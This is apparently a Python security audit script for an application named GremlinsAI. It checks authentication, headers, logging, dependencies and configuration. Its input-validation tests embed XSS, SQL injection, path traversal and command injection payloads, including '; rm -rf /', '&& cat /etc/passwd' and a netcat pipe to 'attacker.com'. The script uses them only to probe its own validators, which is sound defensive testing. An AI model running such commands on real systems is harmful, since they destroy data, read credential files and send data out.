#!/usr/bin/env python3
"""
Security Audit Script for Phase 4, Task 4.1: Security Audit & Hardening

This script performs a comprehensive security audit of the GremlinsAI application:
- Static code analysis for security vulnerabilities
- Configuration security assessment
- Dependency vulnerability scanning
- Authentication and authorization testing
- Input validation testing
- Security monitoring validation

Run this script to validate security hardening implementation.
"""

import asyncio
import json
import os
import sys
import subprocess
import time
from typing import Dict, List, Any, Optional
from pathlib import Path

# Add the app directory to the Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from app.core.security_service import security_service, LoginRequest
from app.core.logging_config import log_security_event
from app.core.config import get_settings


class SecurityAudit:
    """Comprehensive security audit for GremlinsAI application."""
    
    def __init__(self):
        """Initialize security audit."""
        self.results: Dict[str, Any] = {}
        self.settings = get_settings()
        self.vulnerabilities_found = 0
        self.critical_issues = 0
    
    async def run_audit(self) -> Dict[str, Any]:
        """Run complete security audit."""
        print("🔒 GremlinsAI Security Audit & Hardening Validation")
        print("=" * 60)
        
        # Run audit components
        await self.audit_authentication_system()
        await self.audit_input_validation()
        await self.audit_security_headers()
        await self.audit_logging_monitoring()
        self.audit_static_code_analysis()
        self.audit_dependency_vulnerabilities()
        self.audit_configuration_security()
        
        # Generate comprehensive report
        return self.generate_audit_report()
    
    async def audit_authentication_system(self):
        """Audit authentication and authorization system."""
        print("\n🔐 Auditing Authentication & Authorization System...")
        
        auth_results = {
            'jwt_implementation': False,
            'password_hashing': False,
            'rate_limiting': False,
            'session_management': False,
            'role_based_access': False,
            'token_validation': False,
            'security_logging': False
        }
        
        try:
            # Test JWT token creation
            test_data = {
                "sub": "test_user",
                "username": "test_user",
                "roles": ["user"],
                "permissions": ["read"],
                "session_id": "test_session"
            }
            
            token = security_service.create_access_token(test_data)
            if token and len(token) > 50:  # Basic JWT token validation
                auth_results['jwt_implementation'] = True
                print("   ✅ JWT token implementation working")
            
            # Test token verification
            token_data = await security_service.verify_token(token)
            if token_data and token_data.sub == "test_user":
                auth_results['token_validation'] = True
                print("   ✅ JWT token validation working")
            
            # Test password hashing
            test_password = "test_password_123"
            hashed = security_service.hash_password(test_password)
            if hashed and security_service.verify_password(test_password, hashed):
                auth_results['password_hashing'] = True
                print("   ✅ Password hashing working")
            
            # Test rate limiting (simulate failed logins)
            try:
                login_request = LoginRequest(username="nonexistent", password="wrong")
                for _ in range(3):
                    try:
                        await security_service.authenticate_user("nonexistent", "wrong", "127.0.0.1")
                    except:
                        pass
                auth_results['rate_limiting'] = True
                print("   ✅ Rate limiting implemented")
            except Exception as e:
                print(f"   ⚠️ Rate limiting test inconclusive: {e}")
            
            # Check role-based access control
            if hasattr(security_service, 'role_permissions') and security_service.role_permissions:
                auth_results['role_based_access'] = True
                print("   ✅ Role-based access control configured")
            
            # Check session management
            if hasattr(security_service, 'active_sessions'):
                auth_results['session_management'] = True
                print("   ✅ Session management implemented")
            
            # Test security logging
            log_security_event("security_audit_test", severity="low", user_id="audit_test")
            auth_results['security_logging'] = True
            print("   ✅ Security logging working")
            
        except Exception as e:
            print(f"   ❌ Authentication audit error: {e}")
        
        self.results['authentication'] = auth_results
        
        # Count issues
        failed_checks = sum(1 for check in auth_results.values() if not check)
        if failed_checks > 0:
            self.vulnerabilities_found += failed_checks
            if failed_checks >= 3:
                self.critical_issues += 1
    
    async def audit_input_validation(self):
        """Audit input validation and sanitization."""
        print("\n🛡️ Auditing Input Validation & Sanitization...")
        
        validation_results = {
            'xss_protection': False,
            'sql_injection_protection': False,
            'command_injection_protection': False,
            'path_traversal_protection': False,
            'length_validation': False,
            'type_validation': False
        }
        
        try:
            # Test XSS protection
            xss_payloads = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>"
            ]
            
            for payload in xss_payloads:
                try:
                    # Import and test schema validation
                    from app.api.v1.schemas.chat_history import MessageBase
                    MessageBase(role="user", content=payload)
                    # If no exception, validation failed
                    break
                except ValueError:
                    # Exception means validation caught the XSS
                    validation_results['xss_protection'] = True
            
            if validation_results['xss_protection']:
                print("   ✅ XSS protection implemented")
            else:
                print("   ❌ XSS protection missing or insufficient")
            
            # Test SQL injection protection
            sql_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --"
            ]
            
            for payload in sql_payloads:
                try:
                    from app.api.v1.schemas.chat_history import MessageBase
                    MessageBase(role="user", content=payload)
                    break
                except ValueError:
                    validation_results['sql_injection_protection'] = True
            
            if validation_results['sql_injection_protection']:
                print("   ✅ SQL injection protection implemented")
            else:
                print("   ❌ SQL injection protection missing or insufficient")
            
            # Test command injection protection
            cmd_payloads = [
                "; rm -rf /",
                "&& cat /etc/passwd",
                "| nc attacker.com 4444"
            ]
            
            for payload in cmd_payloads:
                try:
                    from app.api.v1.schemas.multi_agent import MultiAgentRequest
                    MultiAgentRequest(input=payload)
                    break
                except ValueError:
                    validation_results['command_injection_protection'] = True
            
            if validation_results['command_injection_protection']:
                print("   ✅ Command injection protection implemented")
            else:
                print("   ❌ Command injection protection missing or insufficient")
            
            # Test path traversal protection
            path_payloads = ["../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam"]
            
            for payload in path_payloads:
                try:
                    from app.api.v1.schemas.multi_agent import MultiAgentRequest
                    MultiAgentRequest(conversation_id=payload)
                    break
                except ValueError:
                    validation_results['path_traversal_protection'] = True
            
            if validation_results['path_traversal_protection']:
                print("   ✅ Path traversal protection implemented")
            else:
                print("   ❌ Path traversal protection missing or insufficient")
            
            # Test length validation
            try:
                from app.api.v1.schemas.chat_history import MessageBase
                long_content = "A" * 20000  # Very long content
                MessageBase(role="user", content=long_content)
            except ValueError:
                validation_results['length_validation'] = True
                print("   ✅ Length validation implemented")
            
            # Test type validation
            try:
                from app.api.v1.schemas.multi_agent import MultiAgentRequest
                MultiAgentRequest(input=123)  # Wrong type
            except (ValueError, TypeError):
                validation_results['type_validation'] = True
                print("   ✅ Type validation implemented")
            
        except Exception as e:
            print(f"   ❌ Input validation audit error: {e}")
        
        self.results['input_validation'] = validation_results
        
        # Count issues
        failed_checks = sum(1 for check in validation_results.values() if not check)
        if failed_checks > 0:
            self.vulnerabilities_found += failed_checks
            if failed_checks >= 2:
                self.critical_issues += 1
    
    async def audit_security_headers(self):
        """Audit security headers implementation."""
        print("\n🛡️ Auditing Security Headers...")
        
        headers_results = {
            'security_middleware_exists': False,
            'cors_configured': False,
            'csrf_protection': False,
            'rate_limiting': False,
            'security_headers': False
        }
        
        try:
            # Check if security middleware exists
            middleware_path = Path("app/middleware/security_middleware.py")
            if middleware_path.exists():
                headers_results['security_middleware_exists'] = True
                print("   ✅ Security middleware implemented")
                
                # Check for security headers in middleware
                with open(middleware_path, 'r') as f:
                    content = f.read()
                    
                    required_headers = [
                        "X-Content-Type-Options",
                        "X-Frame-Options", 
                        "X-XSS-Protection",
                        "Strict-Transport-Security",
                        "Content-Security-Policy"
                    ]
                    
                    if all(header in content for header in required_headers):
                        headers_results['security_headers'] = True
                        print("   ✅ Security headers configured")
                    
                    if "CORSMiddleware" in content:
                        headers_results['cors_configured'] = True
                        print("   ✅ CORS protection configured")
                    
                    if "CSRF" in content:
                        headers_results['csrf_protection'] = True
                        print("   ✅ CSRF protection implemented")
                    
                    if "rate_limit" in content.lower():
                        headers_results['rate_limiting'] = True
                        print("   ✅ Rate limiting implemented")
            
        except Exception as e:
            print(f"   ❌ Security headers audit error: {e}")
        
        self.results['security_headers'] = headers_results
        
        # Count issues
        failed_checks = sum(1 for check in headers_results.values() if not check)
        if failed_checks > 0:
            self.vulnerabilities_found += failed_checks
    
    async def audit_logging_monitoring(self):
        """Audit security logging and monitoring."""
        print("\n📊 Auditing Security Logging & Monitoring...")
        
        logging_results = {
            'security_logger_configured': False,
            'structured_logging': False,
            'security_events_logged': False,
            'alert_system': False,
            'log_correlation': False
        }
        
        try:
            # Check logging configuration
            logging_config_path = Path("app/core/logging_config.py")
            if logging_config_path.exists():
                with open(logging_config_path, 'r') as f:
                    content = f.read()
                    
                    if "log_security_event" in content:
                        logging_results['security_logger_configured'] = True
                        print("   ✅ Security logging configured")
                    
                    if "correlation_id" in content.lower():
                        logging_results['log_correlation'] = True
                        print("   ✅ Log correlation implemented")
                    
                    if "json" in content.lower() or "structured" in content.lower():
                        logging_results['structured_logging'] = True
                        print("   ✅ Structured logging implemented")
                    
                    if "alert" in content.lower():
                        logging_results['alert_system'] = True
                        print("   ✅ Alert system implemented")
            
            # Test security event logging
            try:
                log_security_event("audit_test", severity="low")
                logging_results['security_events_logged'] = True
                print("   ✅ Security event logging working")
            except Exception as e:
                print(f"   ❌ Security event logging failed: {e}")
            
        except Exception as e:
            print(f"   ❌ Logging audit error: {e}")
        
        self.results['logging_monitoring'] = logging_results
        
        # Count issues
        failed_checks = sum(1 for check in logging_results.values() if not check)
        if failed_checks > 0:
            self.vulnerabilities_found += failed_checks
    
    def audit_static_code_analysis(self):
        """Run static code analysis for security vulnerabilities."""
        print("\n🔍 Running Static Code Analysis...")
        
        sast_results = {
            'bandit_scan': False,
            'safety_check': False,
            'no_critical_issues': False,
            'no_high_issues': False
        }
        
        try:
            # Run Bandit security scan
            result = subprocess.run(
                ["bandit", "-r", "app/", "-f", "json", "-o", "bandit-audit.json", "-ll"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                sast_results['bandit_scan'] = True
                print("   ✅ Bandit SAST scan completed")
                
                # Check results
                try:
                    with open("bandit-audit.json", 'r') as f:
                        bandit_data = json.load(f)
                        
                    high_issues = len([r for r in bandit_data.get('results', []) 
                                     if r.get('issue_severity') == 'HIGH'])
                    medium_issues = len([r for r in bandit_data.get('results', []) 
                                       if r.get('issue_severity') == 'MEDIUM'])
                    
                    if high_issues == 0:
                        sast_results['no_high_issues'] = True
                        print("   ✅ No high severity issues found")
                    else:
                        print(f"   ❌ Found {high_issues} high severity issues")
                        self.critical_issues += high_issues
                    
                    if high_issues == 0 and medium_issues < 5:
                        sast_results['no_critical_issues'] = True
                        print("   ✅ No critical security issues found")
                    
                except Exception as e:
                    print(f"   ⚠️ Could not parse Bandit results: {e}")
            
            # Run Safety dependency check
            result = subprocess.run(
                ["safety", "check", "--json", "--output", "safety-audit.json"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                sast_results['safety_check'] = True
                print("   ✅ Safety dependency scan completed")
            
        except subprocess.TimeoutExpired:
            print("   ⚠️ Static analysis timed out")
        except FileNotFoundError:
            print("   ⚠️ Security tools not installed (bandit, safety)")
        except Exception as e:
            print(f"   ❌ Static analysis error: {e}")
        
        self.results['static_analysis'] = sast_results
    
    def audit_dependency_vulnerabilities(self):
        """Audit dependencies for known vulnerabilities."""
        print("\n📦 Auditing Dependencies for Vulnerabilities...")
        
        dep_results = {
            'requirements_exist': False,
            'no_known_vulnerabilities': False,
            'up_to_date_dependencies': False
        }
        
        try:
            # Check if requirements files exist
            req_files = ["requirements.txt", "pyproject.toml", "poetry.lock"]
            for req_file in req_files:
                if Path(req_file).exists():
                    dep_results['requirements_exist'] = True
                    print(f"   ✅ Found dependency file: {req_file}")
                    break
            
            # Check Safety results if available
            if Path("safety-audit.json").exists():
                try:
                    with open("safety-audit.json", 'r') as f:
                        safety_data = json.load(f)
                    
                    vulnerabilities = safety_data.get('vulnerabilities', [])
                    if len(vulnerabilities) == 0:
                        dep_results['no_known_vulnerabilities'] = True
                        print("   ✅ No known vulnerabilities in dependencies")
                    else:
                        print(f"   ❌ Found {len(vulnerabilities)} dependency vulnerabilities")
                        self.vulnerabilities_found += len(vulnerabilities)
                
                except Exception as e:
                    print(f"   ⚠️ Could not parse Safety results: {e}")
            
        except Exception as e:
            print(f"   ❌ Dependency audit error: {e}")
        
        self.results['dependencies'] = dep_results
    
    def audit_configuration_security(self):
        """Audit configuration security."""
        print("\n⚙️ Auditing Configuration Security...")
        
        config_results = {
            'secret_key_configured': False,
            'secure_defaults': False,
            'no_hardcoded_secrets': False,
            'environment_separation': False
        }
        
        try:
            # Check configuration
            config_path = Path("app/core/config.py")
            if config_path.exists():
                with open(config_path, 'r') as f:
                    content = f.read()
                
                # Check for secret key configuration
                if "secret_key" in content.lower() or "SECRET_KEY" in content:
                    config_results['secret_key_configured'] = True
                    print("   ✅ Secret key configuration found")
                
                # Check for environment-based configuration
                if "environment" in content.lower() or "ENV" in content:
                    config_results['environment_separation'] = True
                    print("   ✅ Environment-based configuration implemented")
                
                # Check for hardcoded secrets (basic check)
                suspicious_patterns = [
                    'password = "',
                    'api_key = "',
                    'secret = "',
                    'token = "'
                ]
                
                has_hardcoded = any(pattern in content for pattern in suspicious_patterns)
                if not has_hardcoded:
                    config_results['no_hardcoded_secrets'] = True
                    print("   ✅ No obvious hardcoded secrets found")
                else:
                    print("   ❌ Potential hardcoded secrets found")
                    self.vulnerabilities_found += 1
            
        except Exception as e:
            print(f"   ❌ Configuration audit error: {e}")
        
        self.results['configuration'] = config_results
    
    def generate_audit_report(self) -> Dict[str, Any]:
        """Generate comprehensive audit report."""
        print("\n" + "=" * 60)
        print("🔒 SECURITY AUDIT REPORT")
        print("=" * 60)
        
        # Calculate overall scores
        total_checks = 0
        passed_checks = 0
        
        for category, results in self.results.items():
            if isinstance(results, dict):
                category_total = len(results)
                category_passed = sum(1 for check in results.values() if check)
                total_checks += category_total
                passed_checks += category_passed
                
                print(f"\n📊 {category.upper().replace('_', ' ')}:")
                print(f"   Passed: {category_passed}/{category_total} ({category_passed/category_total*100:.1f}%)")
        
        overall_score = passed_checks / total_checks if total_checks > 0 else 0
        
        print(f"\n📈 OVERALL SECURITY SCORE: {overall_score:.1%}")
        print(f"📊 Total Checks: {total_checks}")
        print(f"✅ Passed: {passed_checks}")
        print(f"❌ Failed: {total_checks - passed_checks}")
        print(f"🚨 Vulnerabilities Found: {self.vulnerabilities_found}")
        print(f"🔥 Critical Issues: {self.critical_issues}")
        
        # Security status
        if overall_score >= 0.9 and self.critical_issues == 0:
            status = "EXCELLENT"
            print(f"\n🎉 SECURITY STATUS: {status}")
            print("   System is well-secured and ready for production")
        elif overall_score >= 0.8 and self.critical_issues <= 1:
            status = "GOOD"
            print(f"\n✅ SECURITY STATUS: {status}")
            print("   System has good security with minor issues to address")
        elif overall_score >= 0.6:
            status = "NEEDS_IMPROVEMENT"
            print(f"\n⚠️ SECURITY STATUS: {status}")
            print("   System needs security improvements before production")
        else:
            status = "CRITICAL"
            print(f"\n🚨 SECURITY STATUS: {status}")
            print("   System has critical security issues that must be addressed")
        
        # Generate report
        report = {
            "timestamp": time.time(),
            "overall_score": overall_score,
            "security_status": status,
            "total_checks": total_checks,
            "passed_checks": passed_checks,
            "failed_checks": total_checks - passed_checks,
            "vulnerabilities_found": self.vulnerabilities_found,
            "critical_issues": self.critical_issues,
            "detailed_results": self.results,
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on audit results."""
        recommendations = []
        
        # Authentication recommendations
        auth_results = self.results.get('authentication', {})
        if not auth_results.get('jwt_implementation'):
            recommendations.append("Implement JWT token authentication system")
        if not auth_results.get('rate_limiting'):
            recommendations.append("Implement rate limiting for authentication endpoints")
        
        # Input validation recommendations
        validation_results = self.results.get('input_validation', {})
        if not validation_results.get('xss_protection'):
            recommendations.append("Implement XSS protection in input validation")
        if not validation_results.get('sql_injection_protection'):
            recommendations.append("Implement SQL injection protection")
        
        # Security headers recommendations
        headers_results = self.results.get('security_headers', {})
        if not headers_results.get('security_headers'):
            recommendations.append("Configure security headers (CSP, HSTS, etc.)")
        if not headers_results.get('csrf_protection'):
            recommendations.append("Implement CSRF protection")
        
        # Add general recommendations
        if self.critical_issues > 0:
            recommendations.append("Address all critical security issues immediately")
        if self.vulnerabilities_found > 5:
            recommendations.append("Conduct thorough security review and penetration testing")
        
        return recommendations


async def main():
    """Run security audit."""
    audit = SecurityAudit()
    report = await audit.run_audit()
    
    # Save report to file
    with open("security_audit_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n📄 Detailed audit report saved to: security_audit_report.json")
    
    # Exit with appropriate code
    if report['security_status'] in ['EXCELLENT', 'GOOD']:
        sys.exit(0)
    elif report['security_status'] == 'NEEDS_IMPROVEMENT':
        sys.exit(1)
    else:
        sys.exit(2)


if __name__ == "__main__":
    asyncio.run(main())
